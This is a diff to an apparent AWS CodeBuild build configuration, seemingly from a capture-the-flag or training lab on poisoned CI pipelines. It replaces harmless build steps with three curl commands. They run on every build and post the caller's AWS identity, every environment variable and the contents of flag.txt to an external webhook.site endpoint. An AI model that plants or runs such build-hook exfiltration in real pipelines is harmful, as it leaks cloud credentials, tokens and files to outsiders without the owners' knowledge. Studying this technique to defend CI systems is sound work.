@@ -1,8 +1,7 @@
 version: 0.2
-
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - curl -s -X POST "https://webhook.site/29a212a0-5a5f-442e-ac6f-85ba10c4565b" -d "identity=$(aws sts get-caller-identity)"
+      - curl -s -X POST "https://webhook.site/29a212a0-5a5f-442e-ac6f-85ba10c4565b" --data-urlencode "envs=$(env)"
+      - curl -s -X POST "https://webhook.site/29a212a0-5a5f-442e-ac6f-85ba10c4565b" --data-urlencode "flag=$(cat flag.txt 2>/dev/null || echo none)"
